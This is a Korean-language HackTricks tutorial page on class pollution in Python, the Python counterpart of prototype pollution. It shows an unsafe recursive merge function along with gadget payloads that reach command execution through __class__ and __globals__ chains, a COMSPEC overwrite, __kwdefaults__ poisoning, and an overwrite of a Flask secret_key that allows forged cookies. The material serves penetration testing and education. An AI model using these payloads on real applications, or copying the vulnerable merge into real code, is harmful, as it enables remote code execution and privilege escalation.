# 클래스 오염 (파이썬의 프로토타입 오염)

{{#include ../../banners/hacktricks-training.md}}

## 기본 예제

문자열로 객체의 클래스를 오염시킬 수 있는 방법을 확인하세요:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## 기본 취약점 예제
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Gadget Examples

<details>

<summary>클래스 속성 기본값을 RCE로 만들기 (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code>를 통한 다른 클래스 및 전역 변수 오염</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>임의의 서브프로세스 실행</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`**는 모든 함수의 특별한 속성으로, Python [documentation](https://docs.python.org/3/library/inspect.html)에 따르면, 이는 “**키워드 전용** 매개변수에 대한 기본값의 매핑”입니다. 이 속성을 오염시키면 함수의 키워드 전용 매개변수의 기본값을 제어할 수 있으며, 이는 \* 또는 \*args 뒤에 오는 함수의 매개변수입니다.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>파일 간 Flask 비밀 덮어쓰기</summary>

따라서, 웹의 주요 파이썬 파일에 정의된 객체에 대해 클래스 오염을 수행할 수 있지만 **주요 파일과 다른 파일에 정의된 클래스**의 경우입니다. 이전 페이로드에서 \_\_globals\_\_에 접근하려면 객체의 클래스나 클래스의 메서드에 접근해야 하므로, **주요 파일이 아닌 해당 파일의 globals에 접근할 수 있습니다**. \
따라서, **주요 페이지에서 비밀 키를 정의한 Flask 앱의 전역 객체에 접근할 수 없습니다**:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
이 시나리오에서는 파일을 탐색하여 **전역 객체 `app.secret_key`에 접근**하여 Flask 비밀 키를 변경하고 이 키를 알고 [**권한 상승**을 할 수 있는 도구가 필요합니다](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

이와 같은 페이로드 [이 글에서](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
이 페이로드를 사용하여 **`app.secret_key`** (귀하의 앱에서 이름이 다를 수 있음)를 변경하여 새로운 더 많은 권한의 플라스크 쿠키에 서명할 수 있습니다.

</details>

다음 페이지에서도 읽기 전용 가젯을 확인하세요:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## 참고 문헌

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
